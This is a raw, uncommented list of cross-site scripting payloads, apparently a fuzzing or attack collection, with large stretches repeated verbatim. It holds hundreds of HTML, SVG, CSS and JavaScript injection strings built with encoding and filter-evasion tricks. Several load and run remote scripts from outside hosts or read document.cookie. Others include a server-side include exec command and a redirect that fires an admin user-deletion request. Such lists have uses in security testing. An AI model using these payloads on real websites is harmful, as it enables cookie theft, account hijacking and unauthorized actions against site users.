<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<XSS STYLE="xss:expression(alert('XSS'))">
<XSS STYLE="behavior: url(xss.htc);">
¼script¾alert(¢XSS¢)¼/script¾
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<TABLE BACKGROUND="javascript:alert('XSS')">
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<BASE HREF="javascript:alert('XSS');//">
 <OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
 <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1) 
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
‘; alert(1);
‘)alert(1);//
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
<IMG SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(‘XSS’)>      
<img src=xss onerror=alert(1)>
<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}
<img/src=`%00` onerror=this.onerror=confirm(1)
<form><isindex formaction="javascript&colon;confirm(1)"
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
<script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
<iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
<iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert&#x28;1&#x29;">X
</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
http://www.google<script .com>alert(document.location)</script
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<img/src=@&#32;&#13; onerror = prompt('&#49;')
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<script ^__^>alert(String.fromCharCode(49))</script ^__^
</style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
&#00;</form><input type&#61;"date" onfocus="alert(1)">
<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
<script ~~~>alert(0%0)</script ~~~>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<marquee onstart='javascript:alert&#x28;1&#x29;'>^__^
<div/style="width:expression(confirm(1))">X</div> {IE7}
<iframe/%00/ src=javaSCRIPT&colon;alert(1)
//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
</plaintext\></|\><plaintext/onmouseover=prompt(1)
</svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
<iframe style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
<var onmouseover="prompt(1)">On Mouse Over</var>
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<img src="/" =_=" title="onerror='prompt(1)'">
<%<!--'%><script>alert(1);</script -->
<script src="data:text/javascript,alert(1)"></script>
<iframe/src \/\/onload = prompt(1)
<iframe/onreadystatechange=alert(1)
<svg/onload=alert(1)
<input value=<><iframe/src=javascript:confirm(1)
<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
http://www.<script>alert(1)</script .com
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
<svg><script ?>alert(1)
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
<img src=`xx:xx`onerror=alert(1)>
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
<math><a xlink:href="//jsfiddle.net/t846h/">click
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
<svg contentScriptType=text/vbs><script>MsgBox+1
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
<script>+-+-1-+-+alert(1)</script>
<body/onload=&lt;!--&gt;&#10alert(1)>
<script itworksinallbrowsers>/*<script* */alert(1)</script
<img src ?itworksonchrome?\/onerror = alert(1)
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><script onlypossibleinopera:-)> alert(1)
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<div/onmouseover='alert(1)'> style="x:">
<--`<img/src=` onerror=alert(1)> --!>
 <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
<div style="xg-p:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
"><img src=x onerror=window.open('https://www.google.com/');>
<form><button formaction=javascript&colon;alert(1)>CLICKME
<math><a xlink:href="//jsfiddle.net/t846h/">click
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=”jav ascript:alert(‘XSS’);”>
<IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
<<SCRIPT>alert(“XSS”);//<</SCRIPT>
%253cscript%253ealert(1)%253c/script%253e
“><s”%2b”cript>alert(document.cookie)</script>
foo<script>alert(1)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
<BODY ONLOAD=alert(‘XSS’)>
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
<IMG SRC=”javascript:alert(‘XSS’)”
<iframe src=http://ha.ckers.org/scriptlet.html <
javascript:alert("hellox worldss")
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
<script>alert("hellox worldss")</script>&safe=high&cx=006665157904466893121:su_tzknyxug&cof=FORID:9#510
<script>alert("XSS");</script>&search=1
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
<h1><font color=blue>hellox worldss</h1>
<BODY ONLOAD=alert('hellox worldss')>
<input onfocus=write(XSS) autofocus>
<input onblur=write(XSS) autofocus><input autofocus>
<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form><button formaction="javascript:alert(XSS)">lol
<!--<img src="--><img src=x onerror=alert(XSS)//">
<![><img src="]><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
<div style="font-family:'foo&#10;;color:red;';">LOL
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<script>({0:#0=alert/#0#/#0#(0)})</script>
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;
\\";alert('XSS');//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;
&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;
&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
&lt;BODY ONLOAD=alert('XSS')&gt;
&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;
&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;
